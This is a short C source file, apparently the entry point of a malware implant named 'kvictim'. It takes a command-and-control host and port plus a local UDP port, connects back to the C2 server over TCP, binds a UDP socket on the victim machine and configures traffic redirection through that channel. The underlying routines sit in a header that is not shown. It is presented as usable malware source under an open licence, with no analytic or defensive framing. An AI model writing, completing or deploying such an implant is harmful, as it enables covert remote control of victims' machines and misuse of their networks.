// Copyright (c) 2026 Kloveme
// SPDX-License-Identifier: MIT
#include "../include/kvictim.h"
#include <stdio.h>
#include <stdlib.h>

void print_used_method () {
    printf("kvictim <c2_host> <c2_port> <victim_udp_port>");
}

int main (int argc , char* argv[]) {
    if (argc != 4) {print_used_method(); return -1;}
    struct tcp_socket_data tcp_sock_d;
    struct udp_socket_data udp_sock_d;
    struct c2_config_data c2_config_d;
    init_socket(&tcp_sock_d, &udp_sock_d);
    config_c2_connection(argv[1], atoi(argv[2]),
     atoi(argv[3]),
         &c2_config_d);
    config_socket(&tcp_sock_d, &udp_sock_d, &c2_config_d);
    tcp_connection_c2(&tcp_sock_d);
    udp_bind(&udp_sock_d);
    config_udp_redirect(&tcp_sock_d , &udp_sock_d);
}